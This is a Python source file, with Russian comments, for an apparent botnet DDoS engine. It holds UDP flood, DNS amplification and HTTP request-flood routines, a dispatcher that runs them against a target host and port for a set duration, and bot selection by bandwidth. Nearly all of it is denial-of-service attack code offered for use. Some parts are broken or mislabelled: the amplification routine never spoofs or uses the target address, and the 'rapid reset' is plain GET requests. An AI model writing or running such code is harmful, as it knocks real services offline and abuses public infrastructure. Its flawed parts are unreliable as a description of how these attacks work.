import asyncio
import aiohttp
import socket
import random
import struct
import dns.resolver
from engine.proxy import ProxyManager
from utils.logger import log

class AsyncAttackEngine:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.bot_power = {}  # bot_id -> bandwidth (Mbps)
        self.attack_tasks = {}

    def set_bots(self, bot_list):
        self.bot_power = {b['id']: b.get('bandwidth', 10) for b in bot_list}

    # ---------- Smart Attack (улучшение №10) ----------
    async def smart_attack(self, target, method, required_mbps):
        available = sum(self.bot_power.values())
        if available < required_mbps:
            log(f"[Attack] Недостаточно мощности: доступно {available} Mbps, нужно {required_mbps}")
            return False
        selected = []
        current = 0
        for bot_id, bw in sorted(self.bot_power.items(), key=lambda x: -x[1]):
            if current >= required_mbps:
                break
            selected.append(bot_id)
            current += bw
        log(f"[Attack] Выбрано {len(selected)} ботов для атаки {target}")
        # Здесь была бы реальная рассылка команды выбранным ботам
        return True

    # ---------- L4: UDP Flood ----------
    async def udp_flood(self, target_ip, port, duration, threads=50):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        end_time = asyncio.get_event_loop().time() + duration
        while asyncio.get_event_loop().time() < end_time:
            try:
                sock.sendto(payload, (target_ip, port))
            except:
                pass

    # ---------- L4: DNS Amplification ----------
    async def dns_amplification(self, target_ip, port, duration, resolvers_list=None):
        if resolvers_list is None:
            resolvers_list = ['8.8.8.8', '1.1.1.1']  # заменить на список открытых резолверов
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_query = dns.message.make_query('example.com', 'ANY').to_wire()
        end_time = asyncio.get_event_loop().time() + duration
        while asyncio.get_event_loop().time() < end_time:
            for resolver in resolvers_list:
                try:
                    sock.sendto(dns_query, (resolver, 53))
                except:
                    pass

    # ---------- L7: HTTP/2 Rapid Reset (улучшение) ----------
    async def http2_rapid_reset(self, target_url, duration, threads=100):
        # Упрощённая реализация: отправка множества запросов с быстрым сбросом потоков
        async def worker():
            async with aiohttp.ClientSession() as session:
                end_time = asyncio.get_event_loop().time() + duration
                while asyncio.get_event_loop().time() < end_time:
                    try:
                        async with session.get(target_url) as resp:
                            await resp.read()
                    except:
                        pass
        tasks = [asyncio.create_task(worker()) for _ in range(threads)]
        await asyncio.wait(tasks)

    # ---------- Универсальный запуск метода ----------
    async def run_attack(self, method, target, port=80, duration=60, **kwargs):
        log(f"[Attack] Запуск {method} на {target}:{port} на {duration} сек")
        if method == "udp":
            await self.udp_flood(target, port, duration)
        elif method == "dns_amp":
            await self.dns_amplification(target, port, duration, kwargs.get('resolvers'))
        elif method == "http2_reset":
            await self.http2_rapid_reset(f"http://{target}", duration)
        elif method == "smart":
            await self.smart_attack(target, method, kwargs.get('mbps', 1000))
        else:
            log(f"[Attack] Неизвестный метод: {method}")
